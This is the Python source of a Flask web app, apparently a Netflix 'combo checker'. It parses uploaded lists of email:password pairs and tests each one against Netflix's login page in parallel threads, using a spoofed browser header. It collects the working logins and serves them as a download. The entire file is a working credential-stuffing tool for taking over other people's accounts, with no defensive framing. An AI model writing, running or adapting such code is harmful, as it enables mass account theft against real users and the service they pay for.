from flask import Flask, render_template, request, jsonify, send_file
import requests
import re
import os
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['RESULTS_FOLDER'] = 'results'

os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
os.makedirs(app.config['RESULTS_FOLDER'], exist_ok=True)

jobs = {}

def parse_combo_file(filepath):
    combos = []
    netflix_patterns = [r'netflix\.com', r'netflix']
    
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        lines = f.readlines()
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
            
        parts = None
        for sep in [':', '|', ';']:
            if sep in line:
                parts = line.split(sep)
                break
        
        if not parts or len(parts) < 2:
            continue
            
        is_netflix = any(re.search(p, line, re.IGNORECASE) for p in netflix_patterns)
        
        if is_netflix:
            if len(parts) >= 3:
                email = parts[1].strip()
                password = parts[2].strip()
            elif len(parts) == 2:
                email = parts[0].strip()
                password = parts[1].strip()
                if '@' not in email:
                    continue
            else:
                continue
                
            email = re.sub(r'[^\x20-\x7E]', '', email)
            password = re.sub(r'[^\x20-\x7E]', '', password)
            
            if '@' in email and len(password) >= 1:
                combos.append({'email': email, 'password': password, 'raw': line})
    
    return combos

def check_netflix_login(email, password):
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    })
    
    try:
        login_page = session.get('https://www.netflix.com/login', timeout=15)
        
        if login_page.status_code != 200:
            return {'status': 'ERROR', 'email': email, 'password': password, 'reason': 'Connection failed'}
        
        auth_url_match = re.search(r'"authURL":"([^"]+)"', login_page.text)
        if not auth_url_match:
            auth_url_match = re.search(r'"authURL":\s*"([^"]+)"', login_page.text)
        
        auth_url = auth_url_match.group(1) if auth_url_match else ''
        
        login_data = {
            'userLoginId': email,
            'password': password,
            'rememberMe': 'true',
            'flow': 'websiteSignUp',
            'mode': 'login',
            'action': 'loginAction',
            'withFields': 'rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode,recaptchaResponseToken,recaptchaError,flow,mode,action,authURL,previousMode,previousAction,showPassword',
            'authURL': auth_url,
            'nextPage': '',
            'showPassword': ''
        }
        
        login_response = session.post(
            'https://www.netflix.com/login',
            data=login_data,
            timeout=15,
            allow_redirects=True
        )
        
        response_text = login_response.text.lower()
        
        if 'browse' in response_text or '/browse' in login_response.url:
            return {'status': 'VALID', 'email': email, 'password': password}
        
        if 'incorrect password' in response_text or 'senha incorreta' in response_text:
            return {'status': 'INVALID', 'email': email, 'password': password, 'reason': 'Wrong password'}
        
        if 'no account found' in response_text or 'conta não encontrada' in response_text:
            return {'status': 'INVALID', 'email': email, 'password': password, 'reason': 'Account not found'}
        
        if login_response.status_code == 302:
            redirect_url = login_response.headers.get('Location', '')
            if 'browse' in redirect_url or 'watch' in redirect_url:
                return {'status': 'VALID', 'email': email, 'password': password}
        
        cookies = session.cookies.get_dict()
        if 'NetflixId' in cookies or 'SecureNetflixId' in cookies:
            return {'status': 'VALID', 'email': email, 'password': password}
        
        return {'status': 'INVALID', 'email': email, 'password': password, 'reason': 'Login failed'}
        
    except requests.exceptions.Timeout:
        return {'status': 'ERROR', 'email': email, 'password': password, 'reason': 'Timeout'}
    except requests.exceptions.ConnectionError:
        return {'status': 'ERROR', 'email': email, 'password': password, 'reason': 'Connection error'}
    except Exception as e:
        return {'status': 'ERROR', 'email': email, 'password': password, 'reason': str(e)[:50]}
    finally:
        session.close()

def process_job(job_id, combos, max_threads=5):
    jobs[job_id]['status'] = 'running'
    jobs[job_id]['total'] = len(combos)
    jobs[job_id]['checked'] = 0
    jobs[job_id]['valid'] = []
    jobs[job_id]['invalid'] = []
    jobs[job_id]['errors'] = []
    
    def check_wrapper(combo):
        result = check_netflix_login(combo['email'], combo['password'])
        jobs[job_id]['checked'] += 1
        
        if result['status'] == 'VALID':
            jobs[job_id]['valid'].append(result)
        elif result['status'] == 'INVALID':
            jobs[job_id]['invalid'].append(result)
        else:
            jobs[job_id]['errors'].append(result)
        
        return result
    
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [executor.submit(check_wrapper, combo) for combo in combos]
        for future in as_completed(futures):
            pass
    
    jobs[job_id]['status'] = 'completed'
    jobs[job_id]['finished_at'] = datetime.now().isoformat()
    
    result_file = os.path.join(app.config['RESULTS_FOLDER'], f'{job_id}_valid.txt')
    with open(result_file, 'w') as f:
        for v in jobs[job_id]['valid']:
            f.write(f"{v['email']}:{v['password']}\n")
    
    jobs[job_id]['result_file'] = result_file

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'Empty filename'}), 400
    
    if not file.filename.endswith('.txt'):
        return jsonify({'error': 'Only .txt files allowed'}), 400
    
    job_id = f"job_{int(time.time())}_{os.urandom(4).hex()}"
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], f"{job_id}.txt")
    file.save(filepath)
    
    combos = parse_combo_file(filepath)
    
    if not combos:
        os.remove(filepath)
        return jsonify({'error': 'No Netflix combos found in file'}), 400
    
    jobs[job_id] = {
        'id': job_id,
        'status': 'queued',
        'total': len(combos),
        'checked': 0,
        'valid': [],
        'invalid': [],
        'errors': [],
        'started_at': datetime.now().isoformat(),
        'filepath': filepath
    }
    
    thread = threading.Thread(target=process_job, args=(job_id, combos, 5))
    thread.daemon = True
    thread.start()
    
    return jsonify({
        'job_id': job_id,
        'total_combos': len(combos),
        'message': 'Job started'
    })

@app.route('/status/<job_id>')
def status(job_id):
    if job_id not in jobs:
        return jsonify({'error': 'Job not found'}), 404
    
    job = jobs[job_id]
    return jsonify({
        'id': job['id'],
        'status': job['status'],
        'total': job['total'],
        'checked': job['checked'],
        'valid_count': len(job['valid']),
        'invalid_count': len(job['invalid']),
        'error_count': len(job['errors']),
        'progress': round((job['checked'] / job['total']) * 100, 1) if job['total'] > 0 else 0,
        'valid_list': job['valid'][:10] if job['status'] == 'completed' else [],
        'finished_at': job.get('finished_at')
    })

@app.route('/download/<job_id>')
def download(job_id):
    if job_id not in jobs:
        return jsonify({'error': 'Job not found'}), 404
    
    job = jobs[job_id]
    if job['status'] != 'completed':
        return jsonify({'error': 'Job not completed yet'}), 400
    
    result_file = job.get('result_file')
    if not result_file or not os.path.exists(result_file):
        return jsonify({'error': 'Result file not found'}), 404
    
    return send_file(result_file, as_attachment=True, download_name='netflix_valid.txt')

@app.route('/results/<job_id>')
def results(job_id):
    if job_id not in jobs:
        return jsonify({'error': 'Job not found'}), 404
    
    job = jobs[job_id]
    if job['status'] != 'completed':
        return jsonify({'error': 'Job not completed yet'}), 400
    
    return jsonify({
        'valid': job['valid'],
        'invalid': job['invalid'],
        'errors': job['errors']
    })

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
